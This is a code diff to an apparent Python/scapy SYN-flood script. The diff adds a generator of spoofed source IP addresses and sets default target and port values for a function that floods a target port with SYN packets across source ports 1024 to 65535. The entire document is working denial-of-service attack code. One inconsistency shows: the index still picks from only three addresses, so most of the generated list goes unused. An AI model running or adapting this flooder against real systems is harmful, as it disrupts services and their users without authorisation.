@@ -1,8 +1,21 @@
 from scapy.all import *
 import random
 
-def synFlood(tgt, dport):
-	srcList = ['1.2.3.4','10.32.78.121','9.90.12.3']
+def generate_ip():
+	res = []
+	print("Generating IP list...")
+	for i in range(2,254):
+		for j in range(2,254):
+			for k in range(2,254):
+				for l in range(2,5):
+					tmpip = str(i) + '.'  + str(j) + '.' + str(k) + '.' + str(l)		
+					res.append(tmpip)
+	return res
+
+
+
+def synFlood(tgt = "127.0.0.1", dport = 8000):
+	srcList = generate_ip()
 	for sPort in range(1024, 65535):
 		index = random.randrange(3)
 		ipLayer = IP(src = srcList[index], dst = tgt)
